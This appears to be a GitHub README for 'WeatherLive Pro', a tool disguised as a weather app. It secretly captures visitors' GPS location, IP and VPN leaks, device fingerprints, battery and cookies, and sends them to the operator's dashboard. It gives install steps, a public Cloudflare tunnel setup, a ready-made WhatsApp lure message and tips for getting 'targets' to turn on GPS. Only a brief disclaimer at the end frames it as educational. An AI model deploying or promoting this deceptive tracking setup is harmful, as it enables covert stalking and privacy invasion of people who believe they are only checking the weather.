# WeatherLive Pro v1

**GPS-based weather tool with visitor intelligence.**  


---

```
 ██████╗██╗   ██╗██████╗ ███████╗██████╗       ██████╗
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗      ██╔══██╗
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝█████╗██║  ██║
██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗╚════╝██║  ██║
╚██████╗   ██║   ██████╔╝███████╗██║  ██║      ██████╔╝
 ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝      ╚═════╝
                                        [ Your Gateway to Digital Shadows ]
```

---

## What It Does

WeatherLive looks like a regular weather app to anyone who opens it.  
On the backend, it captures full device intelligence — GPS coordinates, fingerprints, network info, battery, screen data — and logs everything to your terminal and disk.

The target sees live temperature, rain alerts, UV index, and a 5-day forecast.  
You see their exact location on Google Maps.

---

## Features

**Frontend (what the target sees)**
- Real-time weather from Open-Meteo API
- GPS-only location — no fake IP approximation
- Hourly forecast + 5-day forecast
- Humidity, wind, pressure, visibility, UV index
- Rain probability, sunrise/sunset
- Smooth dark UI, works on any device

**Backend (what you get)**

| Data Point       | Detail                                        |
|------------------|-----------------------------------------------|
| GPS Coordinates  | Latitude, Longitude, Accuracy (±Nm)           |
| City Name        | Reverse geocoded via OpenStreetMap Nominatim  |
| Google Maps Link | Direct link to their exact position           |
| IP Address       | Server-side + WebRTC leak detection           |
| VPN Detection    | Checks WebRTC vs server IP mismatch           |
| OS & Browser     | Full user agent parsing                       |
| Device Type      | Mobile / Desktop, screen resolution           |
| Hardware         | CPU cores, RAM, GPU (WebGL renderer)          |
| Battery          | Level, charging state, time remaining         |
| Network          | Connection type, download speed, RTT          |
| Fingerprints     | Canvas hash, Audio hash, Device ID (MD5)      |
| Cookies          | First 4 cookies displayed                     |
| Risk Score       | 0–100 — flags bots, VPN, headless browsers    |
| Return Detection | Recognizes same device on repeat visits       |
| Session Tracking | Unique session ID per visit, saved as JSON    |

**Infrastructure**
- Cloudflare Quick Tunnel — no port forwarding, public URL instantly
- Auto URL detection (fixed: no more terms page false match)
- WhatsApp / Telegram share — formatted message, not just a link
- Device location OFF → full OS-specific guide with deep-link to Settings
- Animated terminal banner on startup
- `/dashboard` — live visitor table, auto-refreshes every 30s
- `/results?key=` — raw JSON dump of all sessions

---

## Requirements

```
Python 3.8+
Flask
flask-cors       (auto-installed on first run)
cloudflared      (auto-installed if not found)
```

No other dependencies. Everything else is stdlib.

---

## Installation

```bash
sudo apt update && sudo apt upgrade -y
git clone https://github.com/dhiru69-tech/device_inspector.git
cd device_inspector
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb
bash install.sh

python3 app.py
```

Or just drop the single file anywhere and run it:

```bash
python3 app.py
```

On first run it will install `flask-cors` automatically.  
If `cloudflared` is missing, it downloads and installs it for your platform.

---

## Usage

```
╔════════════════════════════════════════════════════════╗
║  WeatherLive Pro v1 — GPS Only + Cloudflare           ║
╠════════════════════════════════════════════════════════╣

  [CYBER-D] Select >

  [1]  >>  Cloudflare Tunnel  — public URL, share anywhere
  [2]  >>  Local Network      — same WiFi only
```

**Option 1 — Cloudflare (recommended)**  
Generates a public URL like `https://fancy-bear.trycloudflare.com/forecast`  
Share it anywhere. Works from any network, no router config.

**Option 2 — LAN only**  
Serves on your local IP. Target must be on the same WiFi.

---

## Sharing

After tunnel starts, the terminal prints a ready-to-paste WhatsApp message:

```
WeatherLive — Real-Time Local Weather
━━━━━━━━━━━━━━━━━━━━
Check your exact live weather right now:
https://fancy-bear.trycloudflare.com/forecast
━━━━━━━━━━━━━━━━━━━━
GPS-based · Real temperatures
Rain alerts · UV index · 5-day forecast
Free · No ads · No signup needed
```

The weather app itself also has built-in WhatsApp, Telegram, and Copy buttons  
so targets can share it further — spreading your reach.

---

## Dashboard

```
http://localhost:5000/dashboard?key=dhiru2025
```

Live table showing every visitor:  
Session ID · IP · OS/Browser · Mobile/Desktop · GPS Status · Risk Score · Network · Battery

Auto-refreshes every 30 seconds.  
Password prompt on first open — enter `dhiru2025`

---

## Results / JSON Export

```
http://localhost:5000/results?key=dhiru2025
```

Returns all collected sessions as a JSON array.  
Sessions are also saved individually to `~/wl_results/<session_id>.json`

---

## Endpoints

| Route                       | Description                          |
|-----------------------------|--------------------------------------|
| `/`                         | WeatherLive app                      |
| `/forecast`                 | Same as above (cleaner URL)          |
| `/weather` `/live` `/today` | Alternate routes, same page          |
| `/collect`                  | POST — receives visitor data         |
| `/dashboard?key=`           | Live visitor dashboard               |
| `/results?key=`             | Full JSON dump                       |

---

## Platform Support

| Platform     | Status   | Notes                                |
|--------------|----------|--------------------------------------|
| Kali Linux   | Working  | Full feature support                 |
| Ubuntu/Debian| Working  | Full feature support                 |
| Termux       | Working  | `pkg install cloudflared` used       |
| Windows      | Working  | Color via VT mode, winget for cf     |
| macOS        | Working  | `brew install cloudflared` used      |
| Any Linux    | Working  | wget/curl fallback for cloudflared   |

---

## GPS Flow — How Location Works

```
User opens link
    │
    ▼
Browser asks for location permission
    │
    ├── Allow → GPS coordinates captured (±Nm accuracy)
    │           Reverse geocoded → city name
    │           Live watch started → updates on movement
    │
    ├── Deny  → Denied screen + OS-specific fix guide
    │
    └── Device GPS OFF (error.code === 2)
                → Full-screen guide shown
                  Android / iOS / Windows paths
                  Deep-link button tries to open Settings directly
                  "I turned it ON" button retries GPS
```

No IP-based location fallback. Coordinates are real GPS only.

---

## Risk Scoring

Each visitor gets a risk score (0–100):

| Score  | Label        | Triggers                          |
|--------|--------------|-----------------------------------|
| 0–19   | NORMAL       | Clean visit                       |
| 20–49  | SUSPICIOUS   | VPN detected                      |
| 50+    | HIGH RISK    | Bot UA, headless browser, no UA   |

Signals checked: User agent string, WebRTC vs server IP delta, bot keywords.

---

## Device Fingerprinting

**Canvas fingerprint** — draws a gradient + text, hashes the pixel data  
**Audio fingerprint** — runs an oscillator through an analyser, hashes frequency bins  
**Device ID** — MD5 of canvas hash + audio hash + screen resolution

Same device visiting multiple times gets flagged as `returning: true`

---

## File Structure

```
device_inspector.py    — single file, everything embedded
~/wl_results/               — JSON session files saved here
    ├── abc12345.json
    ├── xyz98765.json
    └── ...
```

---

## Customization

**Change dashboard key**
```python
KEY = "dhiru2025"   # line ~57
```

**Change port**
```bash
PORT=8080 python3 
```

**Add custom domain (permanent URL)**
```bash
cloudflared tunnel login
cloudflared tunnel create weatherlive
cloudflared tunnel route dns weatherlive weather.yourdomain.com
```
Then replace the quick tunnel with `--hostname weather.yourdomain.com`

---

## Known Behavior

- **iOS Safari** — Battery API blocked by Apple, returns `Blocked`
- **Firefox** — WebRTC leak detection may return `Not leaked` even on VPN
- **Cloudflare URL** — Changes on every restart (quick tunnel limitation)
- **GPS indoors** — May timeout, falls back to lower accuracy then shows guide
- **Nominatim rate limit** — Free tier, avoid hammering it

---

## Legal

This tool is for educational purposes and authorized security research only.  
Do not deploy against targets without explicit permission.  
You are responsible for how you use it.

---

## Team

```
Team    CYBER-D
Owner   Dhiru
Build   2025.02.17
Lang    Python 3
```

---

*WeatherLive — it's just weather.*
